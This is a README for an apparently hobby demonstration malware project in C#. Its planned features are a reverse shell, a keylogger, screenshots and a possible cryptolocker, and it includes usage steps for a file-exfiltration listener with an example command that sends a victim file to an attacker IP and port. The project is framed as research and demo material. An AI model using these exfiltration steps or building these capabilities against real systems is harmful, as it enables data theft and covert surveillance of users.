Surely Not Another Rancid Executable

This is a reseach-ish project, as well as just aiming to have some fun, and learn some new things.

The aim of this is to have a malware-like executable that can be used for demonstration purposes in an ideal scenario. 

This was originally going to be an extension to https://github.com/thosearetheguise/rev, but achieving some of the goals I want to achieve were going to be too hard in C (I lack the patience or expertise) so I started to write this in C# instead.

Some of the goals are:
 * Spin up a reverse shell.
 * Keylogger.
 * Periodic screenshots.
 * Threading all of the above so that it can do multiple things at once.

Additionally I might add other things in like a cryptolocker, and other functionality that malware is sometimes known for.

Feel free to submit issues or pull requests, however understand that this is for research and demoing things to people under idealised scenarios, so there are two things to ask:
 * No requesting, or submitting pull requests for features that allow hiding or obsfucating this app. The point here is that it _should_ be easy to find, so that if you do try and use it for something malicious there's a chance it will be spotted.
 * No requesting or submitting pull requests for persistence or privilege escalation. I don't want to have a touch time scraping this off my PC every time I run it, so I'm not going to add any in. Also, see the above point.

And in general no using this for illegal purposes. Why you'd want to anyway (given this thing is probably as subtle as a brick to the face) is not my concern, but my point stands. 

## File Exfiltration Usage
On the attackers end, add ExfilListener.py somewhere on the attackers box with an uploads sub directory:
```
| 
/
- ExfilListener.py
- uploads/
-- [Exfiltrated filed will end up here]
```

Run the listener with `python3 ExfilListener.py [Listen Port]` 
On the CnC cend the file and listener details as command arguments:
`exfil "C:\Program Files\File.txt" 192.168.5.22 8000`
Note: File path should be wrapped in quotes (").

Python listener will verify the files MD5 and provide feedback on the results.
